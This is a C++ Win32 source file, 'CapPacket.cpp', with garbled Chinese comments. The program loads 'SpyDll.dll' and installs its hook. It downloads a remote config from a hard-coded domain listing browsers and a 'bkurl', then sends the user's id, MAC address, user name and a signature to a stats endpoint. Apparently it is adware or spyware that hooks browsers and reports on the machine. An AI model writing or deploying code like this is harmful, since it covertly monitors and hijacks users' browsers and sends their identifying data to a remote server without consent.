// CapPacket.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "CapPacket.h"
#include "Utility.h"
#include "CloudHelper.h"
#include "HardInfo.h"
#include "md5.h"

#define MAX_LOADSTRING 100
#define WM_DATA_REPORT			(WM_APP + 101)

// ȫ�ֱ���:
HINSTANCE hInst;								// ��ǰʵ��
TCHAR szTitle[MAX_LOADSTRING];					// �������ı�
TCHAR szWindowClass[MAX_LOADSTRING];			// ����������

TString g_strUserName;
TString g_strUserId;

// �˴���ģ���а����ĺ�����ǰ������:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int, HWND&);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);


BOOL ReadConfigFile(int &nInterval, TString &strBkurl, TString &strBrowsers)
{
	TString strFileName;
	::GetCurrentPath(strFileName);
	strFileName += TEXT("newYxjConfig.ini");

	CCloudHelper cloud;
	TString url = TEXT("http://domain.52wblm.com/ycgg/newYxjConfig.ini");
	_S_OK(cloud.FromUrlToFile(url, strFileName));


	TString strValue;
	TString strSection = TEXT("Interval");	//�����ʾʱ����
	if (GetKeyValue(strFileName, strSection, TEXT("time"), strValue)) {
		nInterval = StrToInt(strValue);
		nInterval *= 60;
	}

	strSection = TEXT("Bkurl");	//������
	GetKeyValue(strFileName, strSection, TEXT("bkurl"), strBkurl);

	strSection = TEXT("Browser");	//������
	GetKeyValue(strFileName, strSection, TEXT("list"), strBrowsers);

	TString str;
	str.Format(TEXT("\n=========Interval = %d===========\n"), nInterval);
	OutputDebugString(str);
	OutputDebugString(TEXT("=================strBkurl :===========\n"));
	OutputDebugString(strBkurl);
	OutputDebugString(TEXT("\n=================Browser :===========\n"));
	OutputDebugString(strBrowsers);

	DeleteFile(strFileName);
	return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	TString strCmd = lpCmdLine;
	_S_OK(GetKeyFormString(strCmd, TEXT("uname"), TEXT(" "), g_strUserName));
	_S_OK(GetKeyFormString(strCmd, TEXT("uid"), TEXT(" "), g_strUserId));

	HMODULE hModule = LoadLibrary(TEXT("SpyDll.dll"));
	if (!hModule) {
		return 0;
	}
	typedef BOOL (__stdcall* fInstallHook)(HMODULE hModule);
	typedef BOOL (__stdcall* fUnInstallHook)();
	typedef BOOL(__stdcall* fSetDataSeg)(HWND hWnd, int nInterval, char* strBkurl, char* strBrowsers);
	fInstallHook Install = NULL;
	fUnInstallHook UnInstall = NULL;
	fSetDataSeg SetDataSeg = NULL;
	if (hModule) {
		Install = (fInstallHook)GetProcAddress(hModule, "InstallHook");
		UnInstall = (fUnInstallHook)GetProcAddress(hModule, "UnInstallHook");
		SetDataSeg = (fSetDataSeg)GetProcAddress(hModule, "SetDataSeg");
		if(Install) {
			Install(hModule);
		}
	} else {
		//MessageBox(NULL, TEXT("�����ļ�ʧ�ܣ�"), NULL, MB_OK);
	}

	
 	// TODO: �ڴ˷��ô��롣
	MSG msg;
	HACCEL hAccelTable;

	// ��ʼ��ȫ���ַ���
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_CAPPACKET, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// ִ��Ӧ�ó����ʼ��:
	HWND hWnd;
	if (!InitInstance(hInstance, nCmdShow, hWnd))
	{
		return FALSE;
	}

	TString strBkurl,strBrowsers;
	int nInterval;
	if (!ReadConfigFile(nInterval, strBkurl, strBrowsers)) {
		return FALSE;
	}
	SetDataSeg(hWnd, nInterval, strBkurl.GetBuffer(), strBrowsers.GetBuffer());

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_CAPPACKET));

	// ����Ϣѭ��:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	if (UnInstall) {
		UnInstall();
	}

	return (int) msg.wParam;
}

BOOL SendData(TString type)
{
	CHardInfo info;

	TString strUrl = TEXT("/stat/show");
	TString strBody;
	strBody.Format(TEXT("id=%s&mac=%s&type=%s&user=%s&pw=%s"),
		g_strUserId,
		info.GetMac(),
		type,
		g_strUserName,
		CMd5::GetSignature(MD5SIG)
		);

	TString strRetData;

	CCloudHelper cloud;
	return cloud.PostReq(strUrl, strBody, strRetData);
}

//
//  ����: MyRegisterClass()
//
//  Ŀ��: ע�ᴰ���ࡣ
//
//  ע��:
//
//    ����ϣ��
//    �˴�������ӵ� Windows 95 �еġ�RegisterClassEx��
//    ����֮ǰ�� Win32 ϵͳ����ʱ������Ҫ�˺��������÷������ô˺���ʮ����Ҫ��
//    ����Ӧ�ó���Ϳ��Ի�ù�����
//    ����ʽ��ȷ�ġ�Сͼ�ꡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_CAPPACKET));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_CAPPACKET);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   ����: InitInstance(HINSTANCE, int)
//
//   Ŀ��: ����ʵ�����������������
//
//   ע��:
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow, HWND& _hWnd)
{
   HWND hWnd;

   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }
   _hWnd = hWnd;

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  ����: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��: ���������ڵ���Ϣ��
//
//  WM_COMMAND	- ����Ӧ�ó���˵�
//  WM_PAINT	- ����������
//  WM_DESTROY	- �����˳���Ϣ������
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
	
	switch (message)
	{
	case WM_DATA_REPORT:
		SendData(TEXT("51wan2.0"));
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// �����˵�ѡ��:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: �ڴ���������ͼ����...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// �����ڡ������Ϣ�������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
